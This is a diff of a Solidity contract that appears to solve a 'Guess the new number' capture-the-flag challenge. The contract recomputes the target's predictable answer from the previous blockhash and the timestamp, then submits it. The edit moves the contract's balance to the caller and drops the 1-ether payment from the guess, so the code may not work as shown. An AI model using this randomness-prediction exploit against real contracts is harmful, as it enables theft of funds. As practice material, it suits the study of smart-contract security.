@@ -1,7 +1,7 @@
  pragma solidity ^0.4.21;
 
 import "./GuessTheNewNumber.sol";
-
+ 
 contract GuessNewAnswer{
     GuessTheNewNumber challenge;
     function GuessNewAnswer(address _challenge) public payable {
@@ -12,9 +12,9 @@ contract GuessNewAnswer{
     function solve() public payable {
         // (msg.sender).transfer(1 ether);
         uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
-        // (msg.sender).transfer(address(this).balance);
-        // challenge.guess(answer);
-        challenge.guess.value(1 ether)(answer);
+        (msg.sender).transfer(address(this).balance);
+        challenge.guess(answer);
+        // challenge.guess.value(1 ether)(answer);
 
     }
     function complete() public pure returns(bool){
@@ -27,6 +27,14 @@ contract GuessNewAnswer{
     // }
 
 } 
+
+
+
+
+
+
+
+
 
 // pragma solidity ^0.7.3;
 
